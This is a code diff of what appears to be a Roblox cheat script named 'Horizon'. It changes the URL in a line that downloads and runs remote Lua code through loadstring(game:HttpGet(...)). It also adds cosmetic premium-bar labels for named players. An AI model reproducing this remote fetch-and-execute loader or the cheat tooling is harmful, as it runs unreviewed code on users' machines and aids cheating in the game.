@@ -3,7 +3,7 @@ if game.PlaceId ~= 2202352383 then return end
 if getgenv().HorizonExecuted == true then return end
 
 spawn(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/kjasudgfisdfh/quan/main/audio', true))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/DesiredVisa/Update/main/Horizon', true))()
 end)
 
 for _,v in pairs(game.CoreGui:GetChildren()) do
@@ -4040,6 +4040,11 @@ spawn(function()
                 ui.PremiumBar.Text.TextColor3 = Color3.fromRGB(0, 0, 0)
                 ui.PremiumBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                 ui.PremiumBar.Visible = true
+            elseif plr.Name == "Dexmunster2" then
+                ui.PremiumBar.Text.Text = "Fluffy"
+                ui.PremiumBar.Text.TextColor3 = Color3.fromRGB(0, 0, 0)
+                ui.PremiumBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                ui.PremiumBar.Visible = true
             elseif plr.Name == "IITheReal_JoeyAltII" then
                 ui.PremiumBar.Text.Text = "Special Joey"
                 ui.PremiumBar.Text.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -4208,6 +4213,11 @@ game.Players.PlayerAdded:Connect(function(plr)
             ui.PremiumBar.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
             ui.PremiumBar.Visible = true
         elseif plr.Name == "Nardoragon2000" then
+            ui.PremiumBar.Text.Text = "Fluffy"
+            ui.PremiumBar.Text.TextColor3 = Color3.fromRGB(0, 0, 0)
+            ui.PremiumBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            ui.PremiumBar.Visible = true
+        elseif plr.Name == "Dexmunster2" then
             ui.PremiumBar.Text.Text = "Fluffy"
             ui.PremiumBar.Text.TextColor3 = Color3.fromRGB(0, 0, 0)
             ui.PremiumBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
